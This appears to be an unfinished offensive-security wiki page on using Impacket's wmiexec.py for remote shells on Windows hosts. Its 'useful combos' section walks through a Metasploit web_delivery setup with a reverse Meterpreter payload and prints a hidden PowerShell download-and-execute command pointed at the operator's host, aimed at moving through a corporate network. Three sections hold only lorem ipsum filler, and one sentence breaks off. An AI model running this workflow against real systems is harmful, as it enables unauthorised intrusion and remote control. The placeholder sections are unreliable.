The Impacket example script `wmiexec.py` is found in the examples directory:

https://github.com/CoreSecurity/impacket/tree/master/examples


### Help Output

```
Impacket v0.9.14-dev - Copyright 2002-2015 Core Security Technologies

usage: wmiexec.py [-h] [-share SHARE] [-nooutput] [-debug]
                  [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
                  target [command [command ...]]

Executes a semi-interactive shell using Windows Management Instrumentation.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>
  command               command to execute at the target. If empty it will
                        launch a semi-interactive shell

optional arguments:
  -h, --help            show this help message and exit
  -share SHARE          share where the output will be grabbed from (default
                        ADMIN$)
  -nooutput             whether or not to print the output (no SMB connection
                        created)
  -debug                Turn DEBUG output ON

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from
                        ccache file (KRB5CCNAME) based on target parameters.
                        If valid credentials cannot be found, it will use the
                        ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256
                        bits)

```


By default, wmiexec will 


## Getting Shells

Getting shells is awesome, but there is a reason why you don't want to just run cmd.exe as the executable to run. Impacket has a special thing it does when you leave the executable off that allows for uploads and downloads, which cmd.exe

### Basic Shell

The basic shell in wmiexec.py is essentially `%COMSPEC%` / cmd.exe with one tine difference, you can upload and download directly from it. This holds a lot of weight when you think about the capabilities to authenticate that Impacket has (password/hashes/kerberos).

```
python wmiexec.py administrator@172.16.102.135
Impacket v0.9.14-dev - Copyright 2002-2015 Core Security Technologies

Password:
[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\temp>
C:\temp>help

 lcd {path}                 - changes the current local directory to {path}
 exit                       - terminates the server process (and this session)
 put {src_file, dst_path}   - uploads a local file to the dst_path (dst_path = default current directory)
 get {file}                 - downloads pathname to the current local dir
 ! {cmd}                    - executes a local shell cmd

C:\temp>get test.log
[*] Downloading C:\\temp\test.log
```

### Shell with Hashes

Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce at iaculis ex, quis ultrices tortor. Nunc fringilla est eu commodo pretium. Praesent blandit dui ante, eu viverra est molestie id. Donec at tellus lacinia, sollicitudin nisl et, mattis tellus. Fusce molestie justo nec mauris feugiat tincidunt. Phasellus non dolor tempor, interdum justo ac, tempus justo. Ut porta, nisi quis cursus fringilla, augue massa gravida dui, nec accumsan nisl justo eu quam. Duis sit amet eleifend orci. Nunc ornare nibh commodo lectus ultrices, id luctus sem molestie.

### Shell with Kerberos

Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce at iaculis ex, quis ultrices tortor. Nunc fringilla est eu commodo pretium. Praesent blandit dui ante, eu viverra est molestie id. Donec at tellus lacinia, sollicitudin nisl et, mattis tellus. Fusce molestie justo nec mauris feugiat tincidunt. Phasellus non dolor tempor, interdum justo ac, tempus justo. Ut porta, nisi quis cursus fringilla, augue massa gravida dui, nec accumsan nisl justo eu quam. Duis sit amet eleifend orci. Nunc ornare nibh commodo lectus ultrices, id luctus sem molestie.

### Shell with aesKey

Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce at iaculis ex, quis ultrices tortor. Nunc fringilla est eu commodo pretium. Praesent blandit dui ante, eu viverra est molestie id. Donec at tellus lacinia, sollicitudin nisl et, mattis tellus. Fusce molestie justo nec mauris feugiat tincidunt. Phasellus non dolor tempor, interdum justo ac, tempus justo. Ut porta, nisi quis cursus fringilla, augue massa gravida dui, nec accumsan nisl justo eu quam. Duis sit amet eleifend orci. Nunc ornare nibh commodo lectus ultrices, id luctus sem molestie.


## Useful combos


### Web Delivery plus WMIEXEC through a Metasploit socks4a Proxy

First, we assume that you already have a single shell, one way or another into a corporate network. The internal range used by the network you've gotten a shell on is `172.16.102.0/24` and you are running as an admin.


 ```
msf exploit(web_delivery) > set SRVPORT 8443
SRVPORT => 8443
msf exploit(web_delivery) > set URIPATH /download
URIPATH => /download
msf exploit(web_delivery) > set LPORT 8443
LPORT => 8443
msf exploit(web_delivery) > set TARGET 2
TARGET => 2
msf exploit(web_delivery) > show targets
msf exploit(web_delivery) > set PAYLOAD windows/meterpreter/reverse_https
PAYLOAD => windows/meterpreter/reverse_https

Exploit targets:

   Id  Name
   --  ----
   0   Python
   1   PHP
   2   PSH


msf exploit(web_delivery) > show options

Module options (exploit/multi/script/web_delivery):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT  8443             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH  /download        no        The URI to use for this exploit (default is random)


Payload options (windows/meterpreter/reverse_https):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: , , seh, thread, process, none)
   LHOST     172.16.102.1     yes       The listen hostname
   LPORT     8443             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   2   PSH


msf exploit(web_delivery) > set SSL true
SSL => true
msf exploit(web_delivery) > exploit -j
[*] Exploit running as background job.
msf exploit(web_delivery) >
[*] Started reverse handler on 172.16.102.1:8443
[*] Using URL: https://0.0.0.0:8443/download
[*] Local IP: https://192.168.92.105:8443/download
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};IEX ((new-object net.webclient).downloadstring('https://172.16.102.1:8443/download'))

msf exploit(web_delivery) >
 ```